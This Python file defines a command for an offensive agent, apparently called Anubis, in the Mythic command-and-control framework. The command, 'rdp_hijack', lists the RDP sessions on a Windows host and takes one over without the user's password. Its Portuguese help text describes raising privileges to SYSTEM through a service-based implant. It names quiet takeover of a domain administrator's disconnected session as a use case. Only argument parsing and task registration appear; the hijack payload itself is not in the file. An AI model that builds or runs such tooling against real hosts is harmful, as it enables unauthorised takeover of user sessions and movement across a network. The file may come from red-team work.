from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class RdpHijackArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="session_id",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "ID da sessão RDP a hijackar. "
                    "0 ou vazio = listar todas as sessões ativas no host."
                ),
                default_value=0,
            ),
            CommandParameter(
                name="dest_session",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "ID da sessão destino (onde o desktop será recebido). "
                    "-1 = auto-detecta a sessão do processo Anubis atual."
                ),
                default_value=-1,
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                d = json.loads(self.command_line)
                self.add_arg("session_id",   d.get("session_id",  0),  ParameterType.Number)
                self.add_arg("dest_session", d.get("dest_session", -1), ParameterType.Number)
            else:
                parts = self.command_line.strip().split()
                try:
                    self.add_arg("session_id", int(parts[0]), ParameterType.Number)
                except (IndexError, ValueError):
                    self.add_arg("session_id", 0, ParameterType.Number)
                try:
                    self.add_arg("dest_session", int(parts[1]), ParameterType.Number)
                except (IndexError, ValueError):
                    self.add_arg("dest_session", -1, ParameterType.Number)
        else:
            self.add_arg("session_id",   0,  ParameterType.Number)
            self.add_arg("dest_session", -1, ParameterType.Number)


class RdpHijackCommand(CommandBase):
    cmd         = "rdp_hijack"
    needs_admin = False
    help_cmd    = "rdp_hijack [session_id] [dest_session]"
    description = (
        "RDP Session Hijacking (T1563.002).\n"
        "Lista sessões RDP ativas/desconectadas no host local e hijacka uma sessão "
        "sem necessitar da senha do usuário alvo.\n\n"
        "Modos:\n"
        "  • rdp_hijack         → lista todas as sessões (ID, Station, State, User)\n"
        "  • rdp_hijack <id>    → hijacka sessão <id> → desktop aparece na sessão atual\n"
        "  • rdp_hijack <id> <dest> → hijacka <id> e envia para sessão <dest>\n\n"
        "REQUER SYSTEM:\n"
        "  WTSConnectSession exige SYSTEM. Se Anubis estiver rodando como usuário comum:\n"
        "  1. Implante via sc_exec (cria serviço → SYSTEM) no host alvo\n"
        "  2. Nesse novo agente (SYSTEM) execute rdp_hijack\n\n"
        "Casos de uso:\n"
        "  • Sessão Disconnected: domain admin saiu sem fazer logoff → hijack silencioso\n"
        "  • Sessão Active: usuário está logado → hijack ativo (ele vê o cursor se mover)"
    )
    version               = 1
    author                = "@wtechsec"
    attackmapping         = ["T1563.002"]
    supported_ui_features = []
    argument_class        = RdpHijackArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        sid  = task.args.get_arg("session_id")  or 0
        dest = task.args.get_arg("dest_session")
        if dest is None:
            dest = -1

        if int(sid) == 0:
            task.display_params = "list sessions"
        elif int(dest) < 0:
            task.display_params = "hijack session={} → auto-dest".format(sid)
        else:
            task.display_params = "hijack session={} → dest={}".format(sid, dest)
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
